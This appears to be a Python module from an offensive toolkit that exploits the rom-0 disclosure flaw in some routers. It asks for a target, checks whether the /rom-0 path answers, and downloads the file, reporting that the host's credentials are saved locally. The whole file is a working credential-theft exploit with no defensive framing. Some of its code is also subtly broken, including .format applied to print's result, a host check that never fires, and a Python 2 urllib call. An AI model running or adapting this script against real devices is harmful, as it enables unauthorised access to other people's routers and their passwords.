#!/usr/bin/env python
import os
import requests
import urllib
import sys
from appearance.hue import *

host = 'empty_value'
def run_rom0():
    print (info("Enter the target - eg. 192.168.0.1 "))
    host = input(que('Website/Host: '))
    print (info("Use port 80 if it's a simple webserver or IP address"))
    port = input(que('Port: '))
    if (host == 'empty_value'):
        print(bad("Error. You must set all required fields."))
        pass
    else:
        print(run("Checking if {} is vulnerable...").format(host))
        s_code = requests.get('http://'+host+':'+port+'/rom-0').status_code
        if(s_code != 200):
            print(bad("{} is not vulnerable to exploit.").format(host))
        elif(s_code == 200):
            print(good("{} is vulnerable to exploit.").format(host))
            try:
                try:
                    os.makedirs("output/")
                except:
                    pass
                urllib.urlretrieve('http://'+host+':'+port+'/rom-0', "output/"+host+"-rom-0")
                print(info("Host Credentials saved in output/"+host+"-rom-0. Decompress the file to view."))
            except Exception as e:
                print(bad("Unable to download rom-0 file."))
                print (e)
